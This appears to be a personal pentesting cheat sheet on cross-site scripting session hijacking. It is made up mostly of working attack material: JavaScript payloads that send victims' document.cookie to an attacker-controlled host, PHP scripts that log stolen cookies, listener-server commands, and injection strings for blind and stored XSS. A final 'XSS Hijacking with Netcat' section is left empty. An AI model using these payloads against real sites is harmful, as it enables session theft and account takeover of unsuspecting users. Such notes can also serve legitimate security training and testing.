Blind XSS Session Hijacking:
```txt
#make php server
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:PORT

# Choose a js payload for session hijacking. (More on payloadallthings), create script.js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;

# Make the index.php file with the following code:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

# Send the blind XSS payload that worked, pointed to /script.js
"><script src=http://OUR_IP:PORT/script.js></script>

# once you captured, enter the cookie into the storage in dev tools
```

Stored XSS Hijacking:
```txt
# Create a log.php script to steal cookei through xss:
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

# open a logging listener
php -S <VPN/TUN Adapter IP>:8000

# (OPTION 1) For local network, you can use local listener
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>

# (OPTION 2) for real world, use XSSHunter, Burp Collaborator, Project Interactsh
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

# (OPTION 3) using xss through netcat, 


#Have the victim navigate to the URL that has the payload stored like a user account page
```

XSS Hijacking with Netcat:
```txt
```